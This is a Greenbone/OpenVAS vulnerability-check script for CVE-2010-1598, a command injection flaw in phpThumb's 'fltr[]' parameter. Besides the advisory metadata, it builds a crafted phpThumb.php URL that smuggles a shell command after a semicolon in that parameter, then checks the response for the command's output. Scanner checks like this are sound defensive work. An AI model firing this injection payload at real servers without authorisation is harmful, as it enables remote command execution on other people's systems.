if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.801233" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2010-11-11 07:48:04 +0100 (Thu, 11 Nov 2010)" );
	script_cve_id( "CVE-2010-1598" );
	script_bugtraq_id( 39605 );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_name( "phpThumb 'fltr[]' Parameter Command Injection Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/39556" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/58040" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_phpthumb_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "phpthumb/detected" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to inject and execute
  arbitrary shell commands via specially crafted requests in the context of the web server." );
	script_tag( name: "affected", value: "phpThumb Version 1.7.9" );
	script_tag( name: "insight", value: "The flaw is caused by improper validation of user-supplied input
  via the 'fltr[]' parameter to 'phpThumb.php', which allow attackers to inject
  and execute arbitrary shell commands via specially crafted requests." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "solution", value: "Upgrade to version 1.7.9 or later." );
	script_tag( name: "summary", value: "The host is running phpThumb and is prone to command injection
  vulnerability." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("version_func.inc.sc");
require("misc_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
if(!dir = get_dir_from_kb( port: port, app: "phpThumb" )){
	exit( 0 );
}
cmds = exploit_commands();
for pattern in keys( cmds ) {
	cmd = cmds[pattern];
	url = dir + "/phpThumb.php?src=/home/example.com/public_html/vt.jpg&fltr[]=blur|5%20-quality%2075%20-interlace%20line%20%22/home/example.com/public_html/vt.jpg%22%20jpeg:%22/home/example.com/public_html/vt.jpg%22;\" + cmd + \";&phpThumbDebug=9";
	if(http_vuln_check( port: port, url: url, pattern: pattern )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}

